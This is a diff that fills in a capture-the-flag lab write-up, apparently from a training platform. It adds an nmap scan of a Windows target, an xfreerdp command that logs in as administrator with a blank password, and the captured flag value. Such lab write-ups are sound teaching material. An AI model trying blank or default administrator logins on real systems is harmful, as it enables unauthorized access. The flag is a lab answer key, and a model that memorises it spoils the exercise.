@@ -325,13 +325,29 @@ database ports during enumeration.
 **Concept:** Default credentials
 
 ### Enumeration
-<!-- PASTE YOUR NMAP OUTPUT -->
+nmap -sC -sV 10.129.21.150                     
+
+Nmap scan report for 10.129.21.150
+
+
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+
 
 ### Exploitation
-<!-- PASTE YOUR XFREERDP COMMAND AND OUTPUT -->
+xfreerdp /u:administrator /p: /v:10.129.21.150
+
+ since the credentials are blank there is no need to put 
+ anything in the /p: space.
+
 
 ### Flag
-<!-- PASTE FLAG -->
+once you gain rdp access the flag is on the desktop
+
+flag 951fa96d7830c451b536be5a6be008a0
 
 ### Key Takeaway
 Default and blank credentials on RDP are extremely
